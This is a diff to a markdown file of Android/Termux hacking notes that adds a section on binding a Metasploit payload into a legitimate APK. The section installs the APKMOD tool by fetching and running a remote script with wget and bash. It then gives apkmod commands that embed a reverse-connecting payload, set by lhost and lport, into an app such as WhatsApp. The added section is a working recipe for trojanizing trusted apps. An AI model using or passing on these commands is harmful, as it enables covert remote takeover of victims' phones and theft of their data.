@@ -95,3 +95,18 @@ export CARGO_BUILD_TARGET=aarch64-linux-android && pip install cryptography
 ```
 https://github.com/r00t-3xp10it/meterpeter/blob/master/README.md#attacker-machine-linux-kali
 ```
+##
+#### Bind apk metasploit
+* https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh?fbclid=IwAR15wlxfGnVR-dPgHwpe2BaveBsTt7ZGKdJqRDR--VQUq9x0S5-o3GtJZEY
+```
+Bind Metasploit Payload With App In Termux
+Install APKMOD:
+cd $HOME
+pkg install wget
+wget https://raw.githubusercontent.com/....../master/setup.sh
+bash setup.sh
+apkmod
+Command:
+apkmod -b -i original.apk -o binded.apk lhost=yourLhostHere lport=yourLportHere
+apkmod -b -i /sdcard/Whatsapp.apk -o mybindedapp.apk lhost=127.0.0.1 lport=4444
+```
